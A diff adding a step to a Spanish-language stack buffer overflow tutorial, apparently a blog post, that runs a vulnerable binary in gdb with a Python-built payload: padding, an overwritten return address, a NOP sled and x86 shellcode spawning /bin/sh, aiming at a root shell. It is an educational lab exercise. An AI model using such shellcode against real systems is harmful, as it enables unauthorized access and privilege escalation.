@@ -95,6 +95,10 @@ A continuación lo que hacemos es pasarle al binario NOPs (\x90), que son instru
 
 Ahora podemos hacer que el registro EIP apunte a una dirección intermedia dentro de los NOPs para que el flujo de ejecución se desplace hasta donde terminan estos NOPs, que será donde sobreescribiremos lo que haya con nuestro shellcode que nos ejecutará un /bin/sh y nos devolverá una shell.
 
+Hacemos `r $(python -c 'print "A"*68 + "\x34\xf6\xff\xbf" + "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')` y vemos que efectívamente nos devuelve una shell. Si ejecutamos `whoami` nos devuelve ximo, pero esto es porque estamos dentro del gdb, ahora lo haremos desde fuera del gdb con python y veremos como nos devuelve una shell de root.
+
+![](/assets/images/Stack-Buffer-Overflow-Linux/shell.png)
+
 
 
 
